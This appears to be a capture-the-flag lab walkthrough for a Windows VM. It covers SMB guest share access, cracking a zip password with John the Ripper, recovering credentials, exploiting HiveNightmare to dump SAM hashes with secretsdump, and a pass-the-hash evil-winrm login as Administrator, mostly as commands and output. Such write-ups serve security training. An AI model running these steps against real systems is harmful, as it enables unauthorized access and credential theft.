url=192.168.2.221

`nmap -p- -sV -T4 192.168.2.221`

```txt
Nmap scan report for 192.168.2.221
Host is up (0.00016s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



```text
netexec smb 192.168.2.221             
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing WMI protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing NFS protocol database
[*] Initializing VNC protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         192.168.2.221   445    VM11             [*] Windows 10 / Server 2019 Build 19041 x64 (name:VM11) (domain:VM11) (signing:False) (SMBv1:False)
```

`netexec smb 192.168.2.221 -u guest -p '' --shares`
```
SMB         192.168.2.221   445    VM11             [*] Windows 10 / Server 2019 Build 19041 x64 (name:VM11) (domain:VM11) (signing:False) (SMBv1:False) 
SMB         192.168.2.221   445    VM11             [+] VM11\guest: (Guest)
SMB         192.168.2.221   445    VM11             [*] Enumerated shares
SMB         192.168.2.221   445    VM11             Share           Permissions     Remark
SMB         192.168.2.221   445    VM11             -----           -----------     ------
SMB         192.168.2.221   445    VM11             ADMIN$                          Remoteverwaltung
SMB         192.168.2.221   445    VM11             C$                              Standardfreigabe
SMB         192.168.2.221   445    VM11             IPC$            READ            Remote-IPC
SMB         192.168.2.221   445    VM11             Share           READ           
```

smbclient //192.168.2.221/Share -N

dir
  .                                  DR        0  Tue Jan 24 15:31:51 2023
  ..                                 DR        0  Tue Jan 24 15:31:51 2023
  backup.zip                          A  7456077  Mon Jan 23 13:21:32 2023
  desktop.ini                       AHS       46  Mon Jan 23 10:06:37 2023

get backup.zip

is encrypted

zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Password: !!!sagitario)))

Now can be unzpiped.


In Picture `IMG_2023_0135754.jpg` is username/password
Username: `gamma`
Password: `gammacanbedangerous!`


Login via rdp


Auch user.txt, with content:

`0571749e2ac330a7455809c6b0e7af90`

md5 Hash, original was: `sunshine` (Cracked with crackstation.net)

email file, with content:
```email
Return-Path: <hans.dampf@nudel.de>
Delivered-To: hans.dampf@nudel.de
Received: from mail.nudel.de
        by mail.nudel.de (Dovecot) with LMTP id QSoXKRHPz2OHCgAADJYtSw
        for <hans.dampf@nudel.de>; Tue, 24 Jul 2021 13:29:05 +0100
Received: from smtp.th-deg.de (smtp.nudel.de [132.113.135.186])
        by mail.nudel.de (Postfix) with ESMTPS id A7750899
        for <hans.dampf@nudel.de>; 24 Jul 2021 13:29:05 +0100 (CET)
Received: from [132.113.135.186] (unknown [132.113.135.186])
        by smtp.nudel.de (Postfix) with ESMTPSA id 20B642FB
        for <IT-Support@nudel.de>; Tue, 24 Jul 2021 13:29:05 +0100 (CET)
Message-ID: <24d3cd53-5837-c304-4fa5-0f8c0ad51f7d@nudel.de>
Date: Tue, 24 Jul 2021 13:29:03 +0100
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101
 Thunderbird/102.6.1
To: Hans Dampf <hans.dampf@nudel.de>
From: Tony Stark <IT-Support@nudel.de>
Subject: Info
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-PMX-Version: 6.4.9.2830568, Antispam-Engine: 2.7.2.2107409, Antispam-Data: 2023.1.24.122118, AntiVirus-Engine: 5.94.0, AntiVirus-Data: 2022.10.20.5940000

Hey Hans,

hattet ihr auch Probleme mit der neuen Schwachstelle? Bei uns hats so richtig gekracht. 
Weiß aber nicht mehr genau wie das hieß. Irgendwas mit Nightmare, aber nicht das mit den Druckern.

-- 
Mit freundlichen Grüßen
Tony Stark

Avengers
IT Lead, Billionare, Philanthrop, Playboy

Avengers Tower
NY, 246th Tech Ave
```


Search `nightmare vulnerability 2021` online results in the one with printers

So `nightmare vulnerability 2021 -print` gets rid of this and shows the other vulnerability


[Exploit](https://github.com/GossiTheDog/HiveNightmare?tab=readme-ov-file)

Transfer via updog and excute it. Upload the files to updogs webgui.


`secretsdump.py -system SYSTEM-2024-03-25 -sam SAM-2024-03-25 LOCAL`

```txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x55221814cab6e0d4381e170922897261
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a02a6c668a8d88c7c005330914d92b99:::
Gast:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11b2b18a97f7b0e8e88324091af010b8:::
gamma:1001:aad3b435b51404eeaad3b435b51404ee:754d78b3c7386a01f152c9fcab6c910d:::
[*] Cleaning up...
```


evil-winrm -H a02a6c668a8d88c7c005330914d92b99 -i 102.168.2.221 -u Administrator